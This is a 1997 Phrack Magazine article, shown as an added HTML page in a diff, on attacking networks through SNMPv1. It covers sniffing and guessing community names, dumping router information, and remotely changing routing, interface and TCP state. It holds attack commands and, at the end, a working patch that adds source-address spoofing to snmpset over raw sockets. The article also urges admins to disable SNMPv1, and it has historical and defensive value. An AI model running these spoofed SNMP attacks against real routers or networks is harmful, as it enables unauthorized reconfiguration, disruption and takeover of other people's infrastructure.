@@ -1,0 +1,537 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: SNMP insecurities ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a class="current" href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack50.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack50.tar.gz" title="Get current issue tar.gz">50</a> | <strong>Release date</strong> : <b>1997-04-09</b> | <strong>Editor</strong> : <b>daemon9</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/50/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/50/2.html#article">Phrack Loopback</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/50/3.html#article">Line Noise</a></td><td align="right">various</td></tr>
+<tr><td align="left"><a href="../../issues/50/4.html#article">Phrack Prophile on Aleph1</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/50/5.html#article">Linux TTY hijacking</a></td><td align="right">halflife</td></tr>
+<tr><td align="left"><a href="../../issues/50/6.html#article">Juggernaut</a></td><td align="right">route</td></tr>
+<tr><td align="left"><a href="../../issues/50/7.html#article">SNMP insecurities</a></td><td align="right">Alhambra</td></tr>
+<tr><td align="left"><a href="../../issues/50/8.html#article">Cracking NT Passwords</a></td><td align="right">Nihil</td></tr>
+<tr><td align="left"><a href="../../issues/50/9.html#article">SS7 Diverter plans</a></td><td align="right">Mastermind</td></tr>
+<tr><td align="left"><a href="../../issues/50/10.html#article">Skytel Paging and Voicemail</a></td><td align="right">pbxPhreak</td></tr>
+<tr><td align="left"><a href="../../issues/50/11.html#article">Hardwire Interfacing under Linux</a></td><td align="right">Professor</td></tr>
+<tr><td align="left"><a href="../../issues/50/12.html#article">PC Application Level Security</a></td><td align="right">Sideshow Bob</td></tr>
+<tr><td align="left"><a href="../../issues/50/13.html#article">DTMF signalling and decoding</a></td><td align="right">Mr. Blue</td></tr>
+<tr><td align="left"><a href="../../issues/50/14.html#article">DCO Operating System</a></td><td align="right">mrnobody</td></tr>
+<tr><td align="left"><a href="../../issues/50/15.html#article">Phrack World News</a></td><td align="right">Alhambra</td></tr>
+<tr><td align="left"><a href="../../issues/50/16.html#article">extract.c</a></td><td align="right">Phrack Staff</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : SNMP insecurities</div>
+<div class="opt-bottom"> <strong>Author</strong> : Alhambra</div>
+<pre>                                .oO Phrack 50 Oo.
+ 
+                            Volume Seven, Issue Fifty
+ 
+                                     7 of 16
+ 
+                Network Management Protocol Insecurity: SNMPv1
+                                 alhambra [guild]
+                              alhambra@infonexus.com
+ 
+ 
+As networks have become larger and more complex, a need has been felt by 
+certain portions of the network administration crowd to implement network
+management protocols.  From an administrative point of view, this makes
+a lot of sense; centralize the administration of the network, and make it
+convenient and easy for the administrator to monitor and administer changes
+as needed.  As usual, however, from the security point of view, these 
+protocols are a potential for catastrophe.
+ 
+In this article, we'll explore the world of SNMPv1.  In two later articles
+(to be published in later issues of Phrack) we'll look into other network 
+management schemes (SNMPv2, DCE, etc).  SNMPv1 has been around for a while.  
+In fact, a number of the problems outlined in this paper have been fixed
+with the release of SNMPv2.  As usual, however, large networks who placed
+their original administration burdens on SNMPv1 have been slow to change.
+As a result, large corporations, universities, and some small/cheap ISP's 
+still run their routers/hubs/bridges/hosts/etc with version 1 enabled, often
+in horribly set up configurations.  
+
+The SNMP protocol
+ 
+The SNMP protocol has 5 simple types of messages.  They are get-request,
+get-next-request, set-request, get response and trap.  We will concentrate
+on using the get-* messages to retrieve information from remote sites, routers
+and the like, and the set-request to manipulate a variety of settings on our
+target.
+ 
+SNMP uses UDP as it transport mechanism.  The basic layout of an SNMP packet
+is:
++-----------------------------------------------------------------------------+
+|IP |UDP|Version|Community|PDU |Request|err.|err. |name|value|name|value| ... |
+|Hdr|Hdr|       |         |Type|  ID   |stat|index|    |     |    |     |     |
++-----------------------------------------------------------------------------+
+
+Community is SNMP's authentication mechanism.  PDU type is the type of message
+being sent (get-request, set request, etc.)  Request ID is used to 
+differentiate between requests. Error status is (obviously) used to transport 
+error messages, and error index gives the offset of the variable which was in
+error.  Finally, name and value represent the name of the field requested and 
+either the value to set it to or the value of it on the remote server.  These 
+are defined by a MIB written in ASN.1, and encoded using a code called BER. 
+ASN.1 is used to define data and the types and properties of this data.  
+BER is used to actually transmit the data in a platform independent manner 
+(similar perhaps to XDR.)  
+ 
+The values that can be fetched and set via SNMP are defined in what is called
+the Message Information Base or MIB.  The MIB is written in ASN.1, and defines
+all the different variable classes, types, variables and whatnot associated
+with SNMP.  Standard things in the MIB are classes used to define variables
+associated with data for statistics and values for the system as a whole, the
+interfaces on the system, (possibly) an address translation table, IP, TCP,
+UDP, ICMP, and so on, depending on just what kind of system the agent is
+running on. 
+
+Where exactly do SNMPv1's security flaws lie?  We can narrow them down to
+4 general problem areas:
+1) Use of UDP as a transport mechanism
+2) Use of clear text community names and the presence 
+	of default, overpriveleged communities
+3) Information avaialable
+4) Ability to remotely modify parameters.
+
+They're all related to one another.  We'll go through one by one, define
+the problem, and explain how it is exploitable.  Unfortunately, most of 
+SNMPv1 (from here on out, we'll just call it SNMP) problems stem from its 
+design, and have no easy solution barring the move to SNMPv2 or some other 
+network management protocol.  Some common sense, however, can minimize the 
+problems in most situations.
+
+
+
+UDP as a transport mechanism
+
+  I know I'm not alone in feeling that UDP is, at best, a poor idea when
+used in any sort of application that requires any level of security.  The
+fact that UDP is connectionless leads to a myriad of problems with
+regard to host based authentication, which unfortunately enough, SNMP uses
+as one of its mechanisms.  So we have 2 basic attacks due to the fact that
+a UDP transport is used.  First, we can easily spoof packets to a server, and
+modify/add/reconfigure the state of the server.  As we're using a spoofed
+source address, there isn't any way to get the return message, but the 
+machine we are spoofing will simply drop the response message, and the server
+is none the wiser.  Using our 'snmpset' program which has been modified to
+use a raw socket to allow us to forge the source address, we can modify any
+value in the MIB defined as read-write ASSUMING WE HAVE A PRIVELEGED COMMUNITY
+NAME.  
+
+snmpset -v 1 -e 10.0.10.12 router.pitiful.com cisco00\
+        system.sysName.0 s &quot;owned&quot;
+
+Changes our the router name to 'owned', just in case we want to be really
+obvious that this router has crappy security.
+
+But how do we go about getting a legitimate community name?  We have a few
+different methods we can employ.
+
+
+Use of cleartext community names, and default communities
+
+   One of the most laughable things about the SNMP protocol is its 
+&quot;authentication&quot; method.  I use the term authentication in the loosest
+sense only, as it makes me cringe when I think about it.  SNMP only
+can authenticate based on two different elements.  The source address, as
+we saw above, it trivial to forge, rendering address based authentication
+useless.  The second method is the use of &quot;community&quot; names.  Community names
+can be thought of as passwords to the SNMP agent.  As easily as plaintext
+password can be sniffed from telnet, rlogin, ftp and the like, we can sniff
+them from SNMP packets.  As a matter of fact, it's easier, as every SNMP
+packet will have the community name.  Grab your favorite sniffer (sniffer, not
+password sniffer) and head over to your favorite segement running SNMP.  My
+sniffer of choice is 'snoop' so I'll use it as my example, though using any
+other sniffer should be easy.  SNMP uses port 161.  The field we're after, the
+community, is typically 6-8 characters long.  Cranking up snoop on my segment
+reveals the following. (IP's changed to protect the stupid, of course)
+
+# snoop -x 49,15 port 161
+Using device /dev/le (promiscuous mode)
+10.20.48.94 -&gt; 10.20.19.48 UDP D=161 S=1516 LEN=62
+ 
+           0: 0572 3232 3135 a028 0202 009c 0201 0002    .r4485.(.......
+
+There we go.  Using this community name we're able to grab all the info
+we want, and modify all the parameter and whatnot we desire.  Easy enough...
+if you're able to sniff the segment.  But what happens when you can't?
+
+
+Available Information
+
+When you can't sniff the segment, life gets a little more complicated.  But
+only a little.  We have a few things on our side that may come in handy.  
+First off, almost always there is a default 'public' community.  Very few 
+admin's take the time to deactivate this community, nor realize the risk it
+poses.  Using this community, we can usually read all the information we want.
+Quite often, being able to read the information gives us enough clues to
+try to brute force a legitimate community name.
+
+snmpwalk -v 1 router.pitiful.com public system
+will dump the contents of the system table to us, returning something like:
+
+system.sysDescr.0 = &quot;Cisco Internetwork Operating System Software ..IOS (tm) GS
+Software (RSP-K-M), Version 11.0(4), RELEASE SOFTWARE (fc1)..Copyright (c) 1986
+-1995 by cisco Systems, Inc...Compiled Mon 18-Dec-95 22:54 by alanyu&quot;
+system.sysObjectID.0 = OID: enterprises.Cisco.1.45
+system.sysUpTime.0 = Timeticks: (203889196) 23 days, 14:21:31
+system.sysContact.0 = &quot;Jeff Wright&quot;
+system.sysName.0 = &quot;hws&quot;
+system.sysLocation.0 = &quot;&quot;
+system.sysServices.0 = 6
+
+We see that we're dealing with a cisco router, and we see it's contact's name,
+and the system name.  Same as we might do with guessing passwords, we can use
+this information to try to piece together a community name.  Popular favorites
+include stuff like 'admin' 'router' 'gateway' and the like, combined with
+numbers or whatnot.  Trying something like 'routerhws' for the above example
+might work.  It might not.  While failed attempts are noted, very few people,
+if any, ever check for them.  (as it turns out, the above router had a 
+community name of 'cisco00'.  Imaginative, eh?)  
+
+Even if only public works, there's lots of interesting things available via
+SNMP.  We can dump routing tables, connection tables, statistics on router use.
+In certain situations, we can even get information on packet filters in place,
+and access control rules. All are useful information to have in setting up 
+attacks in conventional manners.   Sometimes public is even given r/w on
+certain tables, and we can do most of what we need to do via that account.
+When we do have a priveledged community though, the fun begins.
+
+
+Remote Manipulation via SNMP
+
+We have all the elements we need to remotely configure the network.  We have
+a community name, we have the ability to forge the manager (the SNMP client)
+address.  All we need to figure out is what we can modify.  This really 
+varies.  There are a set of defaults that almost every SNMP'able machine
+will have.  In addition to these, though, are the 'enterprise' MIB's, which
+define vendor specific SNMP tables and fields.  There's really too much to go
+into here.  Check out ftp://ftp.cisco.com/ or ftp://ftp.ascend.com/ , for
+example...most vendors make their MIB's easy to find.  Cisco's web page also
+has a great introduction to their enterprise MIB's, which detail all the
+differences between different IOS release levels and whatnot.
+IN the meantime, though, check out the following as fun places to begin:
+
+system.sysContact   \
+system.sysName       |- really sorta pointless to change, but hey...whatever.
+system.sysLocation  /
+
+interfaces.ifTable.ifAdminStatus.n (where n is a number, starting at 0)
+
+at.atTable.atIfIndex.n
+at.atTable.atPhysAddress.n
+at.atTable.atNetAddress.n
+
+ip.ipForwarding
+ip.ipDefaultTTL
+ip.ipRouteTable.* (there's tons of stuff in this table)
+ip.ipNetToMediaTable.* (same as above)
+
+tcp.tcpConnState.* (only setable to 12, which deletes the TCB)
+
+and so on.  If you have a copy of TCP/IP Illustrated Vol. 1, the SNMP chapter
+will give you a set of tables with the types of all these values.  If you don't
+have TCP/IP Illustrated, get off your computer and go buy it.
+
+Remember, people don't really like it too much when you muck with their 
+equipment.  Act responsibly.  
+
+And to the admins reading this: TURN OFF SNMPv1!  Think about it.  Any time
+you allow control of you network via the network in a manner as unsafe as
+how SNMPv1 does it, you're creating more problems for yourself.  Realizing
+its all about acceptable risks, realize this isn't one.  Go investigate 
+alternate network management software.  Realize, however, there are always
+going to be problems.  (I don't recommend SNMPv2, however...a few months from
+now when I release my SNMPv2 article and tools, you'll be glad you are not
+running it)
+
+Resources:
+The software I use is based on the UCD modifications to the CMU SNMP 
+distribution.  It is available at:
+
+ftp://ftp.ece.ucdavis.edu/pub/snmp/ucd-snmp-3.1.3.tar.gz
+
+Following this article there is a patch, which are the modifications to
+the snmplib to support address spoofing, and modifications to the 'snmpset'
+app to support them.  The patch is only known to work under Solaris, though
+it should take only minor changes to move it to any other platform.
+
+ftp.cisco.com/pub/mibs and ftp.ascend.com/pub/Software-Releases/SNMP/MIBS
+contain the enterprise MIBS for a variety of different pieces of hardware.
+www.cisco.com/univercd/ contains tons of info on a variety of different 
+Cisco hardware and software, including great references on SNMP under IOS.
+
+http://www.cs.tu-bs.de/ibr/cgi-bin/sbrowser.cgi
+
+has a MIB browser, which allows you to use your favorite web client to
+peruse the standard as well as vendor MIBs  on thier site.
+
+RFC's!  Yes!  All of them.  Go to http://www.internic.net/ds/dspg0intdoc.html
+and read them.  Do a search for SNMP and you'll get back tons of hits.  
+They're a little...hrm...terse at times, but these are the defacto definitions
+of SNMP.  Skimming them will give you more info than you can imagine.
+
+
+&lt;++&gt; SNMPv1/snmp.diff
+*** apps/snmpset.c      Mon Jan 20 09:07:22 1997
+-- apps/snmpset.c       Tue Apr  8 17:21:03 1997
+***************
+*** 77,83 ****
+  
+  void
+  usage(){
+!     fprintf(stderr, &quot;Usage: snmpset -v 1 [-q] hostname community [objectID typ
+e value]+    or:\n&quot;);
+      fprintf(stderr, &quot;Usage: snmpset [-v 2] [-q] hostname noAuth [objectID type
+ value]+     or:\n&quot;);
+      fprintf(stderr, &quot;Usage: snmpset [-v 2] [-q] hostname srcParty dstParty con
+text [oID type val]+\n&quot;);
+      fprintf(stderr, &quot;\twhere type is one of: i, s, x, d, n, o, t, a\n&quot;);
+--- 77,83 ----
+  
+  void
+  usage(){
+!     fprintf(stderr, &quot;Usage: snmpset -v 1 [-e fakeip] [-q] hostname community [
+objectID type value]+    or:\n&quot;);
+      fprintf(stderr, &quot;Usage: snmpset [-v 2] [-q] hostname noAuth [objectID type
+ value]+     or:\n&quot;);
+      fprintf(stderr, &quot;Usage: snmpset [-v 2] [-q] hostname srcParty dstParty con
+text [oID type val]+\n&quot;);
+      fprintf(stderr, &quot;\twhere type is one of: i, s, x, d, n, o, t, a\n&quot;);
+***************
+*** 85,90 ****
+--- 85,93 ----
+      fprintf(stderr, &quot;\t\tn: NULLOBJ, o: OBJID, t: TIMETICKS, a: IPADDRESS\n&quot;);
+  }
+  
++ extern char *fakeaddr;
++ extern int nastyflag;
++ 
+  int
+  main(argc, argv)
+      int           argc;
+***************
+*** 152,158 ****
+                          usage();
+                          exit(1);
+                      }
+!                     break;
+                default:
+                    printf(&quot;invalid option: -%c\n&quot;, argv[arg][1]);
+                    break;
+--- 155,165 ----
+                          usage();
+                          exit(1);
+                      }
+!                   break;
+!               case 'e':
+!                       fakeaddr = argv[++arg];
+!                       nastyflag = 1;
+!                       break;
+                default:
+                    printf(&quot;invalid option: -%c\n&quot;, argv[arg][1]);
+                    break;
+*** snmplib/snmp_api.c  Mon Jan 20 10:43:20 1997
+-- snmplib/snmp_api.c   Tue Apr  8 17:21:08 1997
+***************
+*** 58,63 ****
+--- 58,71 ----
+  #include &lt;sys/select.h&gt;
+  #endif
+  #include &lt;sys/socket.h&gt;
++ 
++ #include &lt;netinet/in_systm.h&gt;
++ #include &lt;netinet/in.h&gt;
++ #include &lt;netinet/ip_var.h&gt;
++ #include &lt;netinet/ip.h&gt;
++ #include &lt;netinet/udp.h&gt;
++ #include &lt;netinet/udp_var.h&gt;
++  
+  #include &lt;netdb.h&gt;
+  #include &quot;asn1.h&quot;
+  #include &quot;snmp.h&quot;
+***************
+*** 847,852 ****
+--- 855,882 ----
+      }
+      return 0;
+  }
++ /* EVIL STUFF in_cksum for forged ip header */
++ unsigned short in_cksum(addr, len)
++     u_short *addr;
++     int len;
++ {
++     register int nleft = len;
++     register u_short *w = addr;
++     register int sum = 0;
++     u_short answer = 0;
++     while (nleft &gt; 1)  {
++         sum += *w++;
++         nleft -= 2;
++     }
++     if (nleft == 1) {
++         *(u_char *)(&amp;answer) = *(u_char *)w ;
++         sum += answer;
++     }
++     sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff); /* add hi 16 to low 16 */
++     sum += (sum &gt;&gt; 16);         /* add carry */
++     answer = ~sum;              /* truncate to 16 bits */
++     return(answer);
++ }
+  
+  /*
+   * Sends the input pdu on the session after calling snmp_build to create
+***************
+*** 857,862 ****
+--- 887,894 ----
+   * On any error, 0 is returned.
+   * The pdu is freed by snmp_send() unless a failure occured.
+   */
++ char *fakeaddr = NULL;
++ int nastyflag = 0;
+  int
+  snmp_send(session, pdu)
+      struct snmp_session *session;
+***************
+*** 1013,1026 ****
+        xdump(packet, length, &quot;&quot;);
+          printf(&quot;\n\n&quot;);
+      }
+  
+! 
+!     if (sendto(isp-&gt;sd, (char *)packet, length, 0,
+!              (struct sockaddr *)&amp;pdu-&gt;address, sizeof(pdu-&gt;address)) &lt; 0){
+!       perror(&quot;sendto&quot;);
+!       snmp_errno = SNMPERR_GENERR;
+!       return 0;
+!     }
+  /*    gettimeofday(&amp;tv, (struct timezone *)0); */
+      tv = Now;
+      if (pdu-&gt;command == GET_REQ_MSG || pdu-&gt;command == GETNEXT_REQ_MSG
+--- 1045,1099 ----
+        xdump(packet, length, &quot;&quot;);
+          printf(&quot;\n\n&quot;);
+      }
++    if(nastyflag == 1)
++       {
++         struct ip *ip_hdr;
++         struct udphdr *udp_hdr;
++         char *payload;
++         int socky;
++         struct sockaddr_in dest;
++         payload = (char*) malloc
++                 (sizeof(struct ip)
++                  + (sizeof(struct udphdr)) + length);
++         ip_hdr = (struct ip*) payload;
++         ip_hdr-&gt;ip_v=4;
++         ip_hdr-&gt;ip_hl=5;
++         ip_hdr-&gt;ip_tos=0;
++         ip_hdr-&gt;ip_off=0;
++         ip_hdr-&gt;ip_id=htons(1+rand()%1000);
++         ip_hdr-&gt;ip_ttl=255;
++         ip_hdr-&gt;ip_p=IPPROTO_UDP;
++         ip_hdr-&gt;ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + len
+gth);
++         ip_hdr-&gt;ip_src.s_addr = inet_addr(fakeaddr);
++         ip_hdr-&gt;ip_dst = pdu-&gt;address.sin_addr;
++         ip_hdr-&gt;ip_sum = in_cksum(&amp;ip_hdr,sizeof(ip_hdr));
++  
++         udp_hdr = (struct udphdr *) (payload + sizeof(struct ip));
++         udp_hdr-&gt;uh_sport = htons(10000+rand()%20000);
++         udp_hdr-&gt;uh_dport = htons(161);
++         udp_hdr-&gt;uh_ulen = htons(length + sizeof(struct udphdr));
++         udp_hdr-&gt;uh_sum = 0;
++         memcpy(payload + sizeof(struct udphdr)+sizeof(struct ip),packet,length
+);
++         dest.sin_family = AF_INET;
++         dest.sin_port = htons(161);
++         dest.sin_addr = pdu-&gt;address.sin_addr;
++         socky = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
++         fprintf(stderr,&quot;Payload size:%d sent\n&quot;,sendto(socky,payload,28+length
+,0,
++                                      (struct sockaddr *)&amp;dest,sizeof(dest)));
++       exit(0);
+  
+!       }
+!       else
+!       {
+!               if (sendto(isp-&gt;sd, (char *)packet, length, 0,
+!                  (struct sockaddr *)&amp;pdu-&gt;address, 
+!                          sizeof(pdu-&gt;address)) &lt; 0)
+!                 {
+!                       perror(&quot;sendto&quot;);
+!                       snmp_errno = SNMPERR_GENERR;
+!                       return 0;
+!                 }
+!          }
+  /*    gettimeofday(&amp;tv, (struct timezone *)0); */
+      tv = Now;
+      if (pdu-&gt;command == GET_REQ_MSG || pdu-&gt;command == GETNEXT_REQ_MSG
+&lt;--&gt; SNMPv1/snmp.diff
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
